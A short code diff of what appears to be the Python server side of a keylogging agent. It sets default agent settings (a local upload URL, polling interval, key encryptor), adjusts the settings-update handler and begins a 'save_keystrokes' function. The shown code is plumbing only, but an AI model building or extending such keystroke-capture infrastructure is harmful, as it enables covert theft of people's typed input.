@@ -5,20 +5,20 @@ from utils import Encryptor, deep_merge, ptime, hour_from_fname, timekey
 
 LOG_DIR = "server_logs"
 agent_settings = {
-    "url": None,
-    "wait_time": None,
-    "option3": None,
-    "option4": None
+    "url": "http://127.0.0.1:5000/api/upload",
+    "wait_time": 10,
+    "status_listen": True,
+    "key_encryptor": "nmrd",
 }
 
 def update_settings(data):
     for key, value in data.items():
-        if key in agent_settings:
+        if value and key in agent_settings:
             agent_settings[key] = value
     return jsonify({"status": "ok", "updated_settings": agent_settings})
 
 def get_settings():
-    return jsonify(agent_settings)
+    return agent_settings
 
 def save_notification(text):
     file_path = "notifications.json"
@@ -30,7 +30,6 @@ def save_notification(text):
         alerts.append(text)
     with open(file_path, "w", encoding="utf-8") as f:
         json.dump(alerts, f, ensure_ascii=False, indent=2)
-
 
 def delete_notification(text):
     alerts = []
@@ -44,8 +43,6 @@ def delete_notification(text):
             break
     with open(file_path, "w", encoding="utf-8") as f:
         json.dump(alerts, f, ensure_ascii=False, indent=2)
-
-
 
 def save_keystrokes(data):
     enc = Encryptor()
